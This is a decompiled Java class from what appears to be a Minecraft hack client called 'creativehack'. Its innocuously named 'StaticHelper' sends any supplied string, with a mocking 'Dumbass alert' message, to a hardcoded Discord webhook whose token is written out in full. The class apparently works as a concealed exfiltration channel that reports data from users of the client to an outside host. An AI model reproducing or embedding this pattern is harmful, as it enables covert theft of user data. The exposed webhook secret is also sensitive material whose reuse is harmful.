// 
// Decompiled by Procyon v0.5.36
// 

package me.xiam.creativehack.setting;

import java.io.IOException;
import me.xiam.creativehack.LoadManager;

public class StaticHelper
{
    public static void send(final String sendThis) {
        final LoadManager webhook = new LoadManager("https://discordapp.com/api/webhooks/778572487264174091/fYd7NAGD61wLFBqFVxsruXj07qnPBIiPd4n8Pxv9xHbTVR6H1w3FGh3zpRWkiSmsiur6");
        webhook.setContent(":rotating_light: Dumbass alert :rotating_light:");
        webhook.setAvatarUrl("https://bigrat.monster/media/bigrat.png");
        webhook.setUsername("Cr4tiv3h4ck");
        webhook.setTts(true);
        webhook.addEmbed(new LoadManager.EmbedObject().setDescription(sendThis));
        try {
            webhook.execute();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
}
